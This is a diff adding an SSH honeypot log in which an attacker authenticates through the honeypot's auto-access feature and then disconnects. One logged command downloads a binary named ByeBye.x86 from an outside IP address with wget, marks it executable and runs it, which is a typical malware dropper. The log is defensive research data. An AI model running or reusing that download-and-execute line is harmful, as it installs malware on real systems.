@@ -1,0 +1,37 @@
+2020-11-14 22:35:55.979 - [Info] MITM Version: 1.26
+2020-11-14 22:35:55.983 - [Info] Auto Access Enabled: true
+2020-11-14 22:35:55.983 - [Debug] [Init] Auto Access Barrier: true
+2020-11-14 22:35:55.995 - [Info] SSH man-in-the-middle server for 172.20.0.201 listening on 0.0.0.0:10000
+2020-11-14 22:45:36.324 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:45:36.817 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:45:36.818 - [Debug] [Auto Access] Attacker: 67.207.90.208, Threshold: 1, Attempts: 1
+2020-11-14 22:45:36.818 - [Debug] [Auto Access] Compromising the honeypot
+2020-11-14 22:45:36.818 - [Debug] [Auto Access] Adding the following credentials: "104.197.98.208:35.161.30.233"
+2020-11-14 22:45:37.067 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-14 22:45:37.067 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.201
+2020-11-14 22:45:37.570 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:45:38.071 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:45:38.071 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-14 22:45:38.071 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.201
+2020-11-14 22:45:38.659 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:45:39.078 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-14 22:45:39.162 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:45:39.163 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-14 22:45:39.163 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.201
+2020-11-14 22:45:39.197 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.249.32.194/bins/ByeBye.x86 -O /tmp/ByeBye; chmod +x /tmp/ByeBye; /tmp/ByeBye ByeBye.x86
+2020-11-14 22:45:40.243 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-14 22:45:41.483 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-14 22:46:40.146 - [Debug] [Connection] Client error on ssh server
+2020-11-14 22:46:40.146 - [Debug] [Connection] Attacker closed connection
+2020-11-14 22:46:40.150 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-14 22:46:40.150 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-14 22:46:41.146 - [Debug] [Connection] Client error on ssh server
+2020-11-14 22:46:41.147 - [Debug] [Connection] Attacker closed connection
+2020-11-14 22:46:41.152 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-14 22:46:41.152 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-14 22:46:42.147 - [Debug] [Connection] Client error on ssh server
+2020-11-14 22:46:42.148 - [Debug] [Connection] Attacker closed connection
+2020-11-14 22:46:42.151 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-14 22:46:42.151 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-14 22:50:40.356 - [Info] Exiting...
+2020-11-14 22:50:40.356 - [Debug] Cleaning up...
